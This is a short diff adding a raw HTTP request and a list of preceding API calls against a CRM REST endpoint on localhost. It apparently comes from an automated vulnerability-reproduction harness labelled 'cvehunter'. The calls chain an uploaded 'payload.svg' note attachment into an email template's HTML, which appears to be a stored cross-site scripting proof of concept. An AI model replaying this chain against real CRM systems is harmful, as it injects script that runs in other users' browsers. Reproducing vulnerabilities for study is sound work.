@@ -1,0 +1,11 @@
+POST /service/v4_1/rest.php HTTP/1.1
+Host: localhost:33116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0 cvehunter-stage10
+Content-Type: application/x-www-form-urlencoded
+
+method=get_entry&input_type=JSON&response_type=JSON&rest_data=["5a79d97fd788032b2f94aba9878ce19c", "EmailTemplates", "36f01f76-51d2-4033-89d0-8dac169b956c", ["id", "body_html"], []]
+
+--- preceding calls (see automation.py) ---
+1) set_entry Notes -> id=995b1a92-a9d2-46e4-8e05-f61cc1451183
+2) set_note_attachment note_id=995b1a92-a9d2-46e4-8e05-f61cc1451183 filename=payload.svg file=<base64 SVG, 142 bytes>
+3) set_entry EmailTemplates body_html='<p>hello</p><img src="http://localhost:33116/index.php?entryPoint=download&type=Notes&id=995b1a92-a9d2-46e4-8e05-f61cc1451183&filename=x.svg" alt="x">' -> id=36f01f76-51d2-4033-89d0-8dac169b956c
